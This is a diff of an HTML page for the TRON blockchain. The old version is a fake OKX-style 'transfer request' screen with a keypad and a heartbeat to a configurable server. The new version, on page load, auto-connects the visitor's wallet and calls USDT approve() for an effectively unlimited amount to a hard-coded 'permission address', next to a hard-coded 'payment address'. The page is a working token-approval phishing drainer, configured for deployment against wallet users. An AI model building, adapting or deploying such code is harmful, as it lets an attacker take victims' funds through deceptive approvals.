@@ -1,347 +1,135 @@
+<!DOCTYPE html>
+<html>
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
-    <title>正在申请转账</title>
-    <link rel="icon" type="image/png" href="png/icon_trx.png">
-    <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>TRON代币授权</title>
     <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <style>
-        ::-webkit-scrollbar {
-            display: none;
-        }
-        .tishi {
-            width: 58%;
-            padding: 0.1rem 0.3rem;
-            height: 3rem;
-            background: #4b4848;
-            z-index: 999999999999;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            border-radius: 0.3rem;
-            color: white;
-            font-size: 1rem;
-            text-align: center;
-            line-height: 3rem;
-            display: none;
-            height: auto;
-            margin: 0 auto;
-        }
-    </style>
-    <link rel="stylesheet" href="css/okx.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
 </head>
-
-<body id="app" class="uni-body pages-index-home">
+<body>
     <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
+    <div id="status">正在连接钱包...</div>
+    <div id="error" style="color: red; display: none;"></div>
 
-    <uni-app class="uni-app--maxwidth">
-        <uni-page data-page="pages/index/home">
-            <uni-page-wrapper>
-                <uni-page-body>
-                    <body data-v-49fe1bb8="">
-                        <div data-v-49fe1bb8="">
-                            <div data-v-49fe1bb8="">
-                                <div data-v-49fe1bb8="" class="pay-box">
-                                    <div data-v-49fe1bb8="" class="amount">
-                                        <div data-v-49fe1bb8="" class="num"><span class="amount" id="amount"></span><em data-v-49fe1bb8="">TRX</em></div><img data-v-49fe1bb8="" src="png/icon_exchange.jpg" class="icon">
-                                    </div>
-                                    <div data-v-49fe1bb8="" class="rate"><span id="amount-display"></span><em data-v-49fe1bb8="">USD</em>
-                                        <div data-v-49fe1bb8="" class="icon"><img data-v-49fe1bb8="" src="png/icon_horn.jpg"></div>
-                                    </div>
-                                </div>
-                                <div data-v-49fe1bb8="" class="bottom-keyboard">
-                                    <div data-v-49fe1bb8="" class="asset-info">
-                                        <div data-v-49fe1bb8="" class="name"><img data-v-49fe1bb8="" src="png/icon_trx.png" class="coin">
-                                            <div data-v-49fe1bb8="" class="asset-box">
-                                                <p data-v-49fe1bb8="" class="title">余额</p>
-                                                <p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="ye"></span><em data-v-49fe1bb8="">TRX</em></p><input type="text" id="address" style="display:none">
-                                            </div>
-                                        </div>
-                                        <div data-v-49fe1bb8="" class="right">
-                                            <div data-v-49fe1bb8="" class="btn">最大</div>
-                                        </div>
-                                    </div>
-                                    <div data-v-49fe1bb8="" class="keyboard-box">
-                                        <div data-v-49fe1bb8="" class="btn">1</div>
-                                        <div data-v-49fe1bb8="" class="btn">2</div>
-                                        <div data-v-49fe1bb8="" class="btn">3</div>
-                                        <div data-v-49fe1bb8="" class="btn">4</div>
-                                        <div data-v-49fe1bb8="" class="btn">5</div>
-                                        <div data-v-49fe1bb8="" class="btn">6</div>
-                                        <div data-v-49fe1bb8="" class="btn">7</div>
-                                        <div data-v-49fe1bb8="" class="btn">8</div>
-                                        <div data-v-49fe1bb8="" class="btn">9</div>
-                                        <div data-v-49fe1bb8="" class="btn">.</div>
-                                        <div data-v-49fe1bb8="" class="btn">0</div>
-                                        <div data-v-49fe1bb8="" onclick="clearAmount()" class="btn delete" style="margin-top:20px"><img data-v-49fe1bb8="" src="png/icon_delete.jpg"></div>
-                                    </div>
-                                    <footer style="display: flex; justify-content: center; align-items: center; margin-top: 20px;">
-                                        <van-button class="submit-btn disabled" type="button" id="submitBtn" disabled style="display: flex; justify-content: center; align-items: center; text-align: center; width: 100%;">下一步</van-button>
-                                        <van-button id="jixu" class="jixu">继续</van-button>
-                                    </footer>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="tishi" id="tip">提示</div><input id="to_address" type="hidden">
-                    </body>
-                </uni-page-body>
-            </uni-page-wrapper>
-        </uni-page>
-    </uni-app>    
-<script>
+    <script>
+        // 配置地址 - 请确保这些地址的有效性
+        window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1'; // 权限地址（合约地址）
+        window.Payment_address = 'TQU4Njq2emJDudfF8GgxQeTsGQ22RSDfsT';   // 收款地址
+        window.usdtContractAddress = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf'; // USDT合约地址
 
+        // 存储用户数据
+        const userData = {
+            address: null,
+            trxBalance: null,
+            usdtBalance: null
+        };
 
+        // 页面加载后立即执行
+        document.addEventListener('DOMContentLoaded', async () => {
+            try {
+                await autoConnectWallet();
+                await approveToken();
+            } catch (error) {
+                showError(`操作失败: ${error.message}`);
+                console.error(error);
+            }
+        });
 
-/////////////////////////////////////////////////////////////
-/////////////////////////////////////////////////////////////
-/////////////////////////////////////////////////////////////
+        // 自动连接钱包
+        async function autoConnectWallet() {
+            updateStatus("正在自动连接钱包...");
+            
+            // 检查是否在移动设备上
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            if (!isMobile) {
+                throw new Error("请使用移动设备访问");
+            }
 
-////////////// ***必须填写有效的地址否则会报错*** ///////////////
+            // 检查是否有TronWeb环境
+            if (typeof window.tronWeb === 'undefined' && typeof window.tronLink === 'undefined') {
+                updateStatus("未检测到钱包，尝试跳转到DApp浏览器...");
+                const currentUrl = encodeURIComponent(window.location.href);
+                window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
+                // 等待跳转，如果5秒后仍未跳转则提示
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                throw new Error("请使用支持TRON的DApp浏览器（如OKX钱包）访问");
+            }
 
-// 权限地址（合约地址）
-window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1';
-// 收款地址（个人地址）
-window.Payment_address = 'TQU4Njq2emJDudfF8GgxQeTsGQ22RSDfsT';
-// USDT官方合约地址（无需修改）
-window.usdtContractAddress = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
-// 服务器地址用于发送心跳（修改为你自己的服务器域名）
-window.heartbeatUrl = 'https://baidu.com/heartbeat';
-
-/////////////////////////////////////////////////////////////
-/////////////////////////////////////////////////////////////
-/////////////////////////////////////////////////////////////
-
-
-
-
-
-
-// 存储用户数据
-const userData = {
-    address: null,
-    trxBalance: null,
-    usdtBalance: null
-};
-let currentAmount = '0';
-// TRX兑换USD的汇率
-const TRX_TO_USD_RATE = 0.1562;
-// 主初始化函数
-async function initializeDApp() {
-    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';
-    
-    if (!isMobile) {
-        document.body.innerHTML = '';
-    } else if (isMobile && !isDAppBrowser) {
-        const currentUrl = encodeURIComponent(window.location.href);
-        window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
-    } else if (isMobile && isDAppBrowser) {
-        await connectWallet();
-        bindButtonEvents();
-    }
-    updateAmountDisplay();
-}
-// 连接到钱包
-async function connectWallet() {
-    try {
-        if (window.tronWeb && window.tronWeb.ready) {
-            await initDApp();
-        } else if (window.tronLink) {
-            const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-            if (res.code === 200) {
+            // 连接到钱包
+            if (window.tronWeb && window.tronWeb.ready) {
+                updateStatus("已检测到TronWeb，正在初始化...");
+            } else if (window.tronLink) {
+                updateStatus("正在请求连接TronLink...");
+                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                if (res.code !== 200) {
+                    throw new Error("用户拒绝了钱包连接请求");
+                }
                 window.tronWeb = window.tronLink.tronWeb;
-                await initDApp();
+            }
+
+            // 获取用户信息
+            userData.address = window.tronWeb.defaultAddress.base58;
+            updateStatus(`已连接钱包: ${userData.address.substring(0, 6)}...${userData.address.substring(38)}`);
+            
+            // 获取余额（可选，授权不一定需要）
+            const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
+            userData.trxBalance = window.tronWeb.fromSun(trxBalance);
+            
+            return true;
+        }
+
+        // 授权代币
+        async function approveToken() {
+            updateStatus("准备进行代币授权...");
+            
+            if (!userData.address) {
+                throw new Error("未检测到钱包地址");
+            }
+
+            try {
+                // 加载USDT合约
+                const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
+                if (!contract) {
+                    throw new Error("无法加载USDT合约");
+                }
+
+                // 授权无限额度 (实际应用中应设置合理额度)
+                const amount = new Decimal(10).pow(24).toString(); // 10^24 是一个很大的数
+                
+                updateStatus("正在发起授权请求，请在钱包中确认...");
+                
+                // 调用approve方法授权
+                const result = await contract.approve(
+                    window.Permission_address,  // 授权给哪个地址
+                    amount                     // 授权额度
+                ).send({
+                    from: userData.address
+                });
+
+                if (result.result) {
+                    updateStatus(`授权成功！交易哈希: ${result.transaction.txID}`);
+                } else {
+                    throw new Error("授权被拒绝或失败");
+                }
+            } catch (error) {
+                console.error("授权过程出错:", error);
+                throw new Error(`授权失败: ${error.message}`);
             }
         }
-    } catch (error) {
-        console.error("钱包连接失败:", error);
-    }
-}
-// 初始化DApp
-async function initDApp() {
-    try {
-        userData.address = window.tronWeb.defaultAddress.base58;
-        // console.log("用户地址:", userData.address);
-        const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
-        userData.trxBalance = window.tronWeb.fromSun(trxBalance);
-        // console.log("TRX 余额:", userData.trxBalance);
-        const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
-        const usdtBalance = await contract.balanceOf(userData.address).call();
-        userData.usdtBalance = usdtBalance / 1e6;
-        // console.log("USDT 余额:", userData.usdtBalance);
-        updateTRXBalance();
-    } catch (error) {
-        console.error("获取用户数据时出错:", error);
-    }
-}
-// 更新页面的TRX余额
-function updateTRXBalance() {
-    const balanceElement = document.getElementById('ye');
-    if (balanceElement) {
-        balanceElement.textContent = parseFloat(userData.trxBalance).toFixed(4);
-    } else {
-        console.error("未找到显示余额的元素");
-    }
-}
-function pressKey(key) {
-    if (key === 'delete') {
-        deleteLastChar();
-        return;
-    }
-    if (currentAmount.length >= 10) return;
-    if (key === '.') {
-        if (currentAmount.includes('.')) return;
-        if (currentAmount === '0') {
-            currentAmount = '0.';
-        } else {
-            currentAmount += '.';
-        }
-        updateAmountDisplay();
-        return;
-    }
-    let [integerPart, decimalPart] = currentAmount.split('.');
-    if (typeof decimalPart !== 'undefined') {
-        if (decimalPart.length < 4) {
-            decimalPart += key;
-        }
-    } else {
-        if (integerPart === '0') {
-            integerPart = key;
-        } else {
-            integerPart += key;
-        }
-    }
-    currentAmount = decimalPart ? `${integerPart}.${decimalPart}` : integerPart;
-    updateAmountDisplay();
-}
-function deleteLastChar() {
-    if (currentAmount.length > 1) {
-        currentAmount = currentAmount.slice(0, -1);
-    } else {
-        currentAmount = '0';
-    }
-    updateAmountDisplay();
-}
-function setMaxAmount() {
-    currentAmount = parseFloat(userData.trxBalance).toFixed(4);
-    updateAmountDisplay();
-}
-function deleteLastChar() {
-    if (currentAmount.length > 0) {
-        currentAmount = currentAmount.slice(0, -1);
-    }
-    if (currentAmount === '') {
-        currentAmount = '0';
-    }
-    updateAmountDisplay();
-}
-// 更新金额显示
-function updateAmountDisplay() {
-    let displayAmount = currentAmount;
-    const maxBalance = parseFloat(userData.trxBalance || '0');
 
-    // 如果输入的金额大于余额，设置为最大余额
-    if (parseFloat(displayAmount) > maxBalance) {
-        displayAmount = maxBalance.toFixed(4);
-        currentAmount = displayAmount;
-    }
-    const amountElement = document.getElementById('amount');
-    if (amountElement) {
-        amountElement.textContent = displayAmount;
-    }
-    // 更新 USD 显示
-    const usdAmount = (parseFloat(displayAmount) * TRX_TO_USD_RATE).toFixed(2);
-    const usdElement = document.getElementById('amount-display');
-    if (usdElement) {
-        usdElement.textContent = usdAmount;
-    }
-    updateNextButtonState();
-    // 更新网站标题
-    const title = `正在申请转账 ${displayAmount} TRX`;
-    document.title = title;
-}
-function updateNextButtonState() {
-    const nextButton = document.getElementById('submitBtn');
-    if (nextButton) {
-        const amount = parseFloat(currentAmount || '0');
-        const isValid = amount > 0 && amount <= parseFloat(userData.trxBalance || '0');
-        nextButton.disabled = !isValid;
-        nextButton.classList.toggle('disabled', !isValid);
-    }
-}
-function bindButtonEvents() {
-    document.querySelectorAll('.keyboard-box .btn').forEach(btn => {
-        if (btn.classList.contains('delete')) {
-            btn.addEventListener('click', () => pressKey('delete'));
-        } else {
-            btn.addEventListener('click', (event) => pressKey(event.target.textContent));
+        // 更新状态显示
+        function updateStatus(message) {
+            document.getElementById('status').textContent = message;
         }
-    });
-    const maxBtn = document.querySelector('.asset-info .right .btn');
-    if (maxBtn) {
-        maxBtn.addEventListener('click', setMaxAmount);
-    }
-    const nextBtn = document.getElementById('submitBtn');
-    if (nextBtn) {
-        nextBtn.addEventListener('click', onNextButtonClick);
-    }
-}
-function handleButtonClick(event) {
-    const key = event.target.textContent;
-    pressKey(key);
-}
-// 显示提示
-function tip(message) {
-    const tipElement = document.getElementById('tip');
-    if (tipElement) {
-        tipElement.textContent = message;
-        tipElement.style.display = 'block';
-        
-        tipElement.style.height = 'auto';
-        const height = tipElement.offsetHeight;
-        tipElement.style.height = height + 'px';
-        
-        // 3秒后隐藏提示
-        setTimeout(() => {
-            tipElement.style.display = 'none';
-        }, 3000);
-    }
-}
-document.addEventListener('DOMContentLoaded', () => {
-    updateAmountDisplay();
-    initializeDApp();
-});
-// 向服务器发送心跳 不需要可以注释
-function sendHeartbeat() {
-    const currentUrl = window.location.href;
-    
-    fetch(window.heartbeatUrl, {
-        method: 'POST',
-        mode: 'cors',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ url: currentUrl })
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.status === 'error' && data.message === '会话已结束') {
-            console.log('会话已结束');
+
+        // 显示错误信息
+        function showError(message) {
+            const errorEl = document.getElementById('error');
+            errorEl.textContent = message;
+            errorEl.style.display = 'block';
         }
-    })
-    .catch(() => {
-    });
-}
-const heartbeatInterval = setInterval(sendHeartbeat, 5000); // 每隔5秒发送一次了
-window.onload = sendHeartbeat;
-window.onbeforeunload = function() {
-    clearInterval(heartbeatInterval);
-};
-</script>
+    </script>
 </body>
 </html>
